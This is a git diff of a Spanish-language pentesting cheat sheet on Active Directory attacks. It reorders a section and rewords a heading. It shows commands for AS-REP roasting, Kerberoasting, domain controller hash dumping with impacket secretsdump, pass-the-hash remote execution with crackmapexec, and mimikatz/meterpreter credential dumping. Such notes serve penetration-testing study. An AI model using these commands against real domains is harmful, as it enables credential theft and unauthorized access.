@@ -13,18 +13,6 @@ impacket-GetNPUsers <dominio>/ -no-pass -usersfile usuarios.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-### Obtener hashes vulnerables (Ataque TGT)
-
-si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
-```bash
-#opcion1
-impacket-secretsdump -just-dc usuario@ip (SAM HASH, para pass-the-hash)
-
-#opcion2
-impacket-GetUserSPNs dominio/usuario:contraseña -request (para john)
-
-```
-
 ### Pass-the-hash
 
 Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un **pass the hash**
@@ -59,8 +47,8 @@ crackmapexec smb <target IP> -u <user> -H "hash"
 ## EJECUTAR COMANDOS
 crackmapexec smb <target IP> -u <user> -H "hash"  -x "ipconfig"
 ```
-### Dumping passwords/hashes con mimikatz
-Para ello se requiere acceso a la máquina y con privilegios elevados, pero es algo que nos puede ser muy útil, el hecho de conseguir los hashes o incluso crear un golden ticket, para acontecer otro tipo de ataques como el pass-the-hash entre otros.
+### Dumping passwords/hashes
+__Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados__
 
 #### Módulo kiwi metasploit
 A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.
@@ -97,4 +85,15 @@ sekurlsa:logonpasswords #si hay alguna en texto plano lo mostrará
 #### Con meterpreter
 ```bash
 hashdump
+```
+
+#### Ataque TGT con impacket
+si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
+```bash
+#opcion1
+impacket-secretsdump -just-dc usuario@ip (SAM HASH, para pass-the-hash)
+
+#opcion2
+impacket-GetUserSPNs dominio/usuario:contraseña -request (para john)
+
 ```
